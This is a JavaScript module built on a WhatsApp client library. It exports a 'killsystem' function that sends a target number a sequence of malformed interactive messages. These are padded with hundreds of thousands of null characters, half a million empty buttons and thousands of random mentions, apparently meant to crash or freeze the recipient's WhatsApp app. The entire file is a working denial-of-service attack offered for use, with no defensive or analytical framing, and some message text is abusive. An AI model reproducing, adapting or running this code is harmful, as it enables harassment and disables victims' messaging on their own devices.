const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function killsystem(sock, target) {
    if (!sock || !target) {
        console.log('[killsystem] missing sock or target');
        return;
    }

    // ---- Sender guard ----
    // Never let the paired number target itself.
    try {
        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
        const senderNum = senderRaw.split('@')[0].split(':')[0];
        const targetNum = String(target).split('@')[0].split(':')[0];
        if (senderNum && targetNum && senderNum === targetNum) {
            console.log('[killsystem] skipped — target equals sender (' + senderNum + ')');
            return;
        }
    } catch (_) {
        // fall through
    }

    const bokep1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "\u0000".repeat(500000)
                    }
                }
            }
        }
    };

    try {
        await sock.relayMessage(target, bokep1, {
            noSelfSync: true
        });
    } catch (e) {
        console.log('[killsystem bokep1]', (e && e.message) ? e.message : e);
    }

    const bokep2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "\u0000".repeat(500000)
                    }
                }
            }
        }
    };

    try {
        await sock.relayMessage(target, bokep2, {
            noSelfSync: true
        });
    } catch (e) {
        console.log('[killsystem bokep2]', (e && e.message) ? e.message : e);
    }

    const msg1 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u0000".repeat(50000) + "shahzuFuckedYou𑇂𑆵𑆴𑆿" + "\u0000".repeat(50000)
                    },
                    nativeFlowMessage: {
                        extra: "\u0000".repeat(50000),
                        buttons: "A".repeat(20000)
                    }
                }
            }
        }
    };

    try {
        await sock.relayMessage(target, msg1, {
            noSelfSync: true
        });
    } catch (e) {
        console.log('[killsystem msg1]', (e && e.message) ? e.message : e);
    }

    const msg2 = {
        interactiveMessage: {
            body: {
                text: "shahzuxmoeed𑇂𑆵𑆴𑆿"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({}))
            }
        }
    };

    try {
        await sock.relayMessage(target, msg2, {
            noSelfSync: true
        });
    } catch (e) {
        console.log('[killsystem msg2]', (e && e.message) ? e.message : e);
    }

    const msg3 = {
        interactiveMessage: {
            body: {
                text: "@shahzu_404𑇂𑆵𑆴𑆿𑆿"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 1000 }, () => ({}))
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 2000 }, () =>
                    Math.floor(Math.random() * 9000000000) + "@s.whatsapp.net"
                ),
                forwardingScore: 999999999,
                isForwarded: true
            }
        }
    };

    try {
        await sock.relayMessage(target, msg3, {
            noSelfSync: true
        });
    } catch (e) {
        console.log('[killsystem msg3]', (e && e.message) ? e.message : e);
    }

    const message = {
        interactiveMessage: {
            body: {
                text: "\u0000".repeat(60000)
            },
            nativeFlowMessage: {
                buttons: "view_ai_message".repeat(30000)
            }
        }
    };

    try {
        await sock.relayMessage(target, message, {
            noSelfSync: true
        });
    } catch (e) {
        console.log('[killsystem message]', (e && e.message) ? e.message : e);
    }
}

module.exports = { killsystem };
